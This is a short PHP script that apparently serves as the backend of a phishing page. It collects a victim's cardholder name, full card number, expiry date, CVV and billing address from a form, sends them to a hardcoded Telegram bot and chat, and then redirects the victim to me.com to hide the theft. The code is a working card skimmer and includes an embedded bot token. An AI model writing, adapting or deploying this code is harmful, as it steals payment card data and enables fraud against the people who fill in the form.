<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Capture the POST data
    $cardholder_name = $_POST['cardholder_name'];
    $card_number = $_POST['card_number'];
    $expiry_month = $_POST['expiry_month'];
    $expiry_year = $_POST['expiry_year'];
    $cvv = $_POST['cvv'];
    $billing_address = $_POST['billing_address'];

    // Construct the message
    $message = "Cardholder Name: $cardholder_name\n";
    $message .= "Card Number: $card_number\n"; // Note: You shouldn't send full card numbers in clear text!
    $message .= "Expiry Date: $expiry_month/$expiry_year\n";
    $message .= "CVV: $cvv\n"; // Note: Sending CVV like this is a major security risk!
    $message .= "Billing Address: $billing_address";

    $token = "6218357486:AAGuejJXswpTYzMMUQWaSaTBcWGYmIar0kw";
    $chat_id = "-1001926682773";

    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message);

    // Send the message to Telegram
    $response = file_get_contents($url);

    // Redirect user to another website
    header('Location: https://www.me.com');
    exit; // Ensure no further processing is done after redirection
}

?>
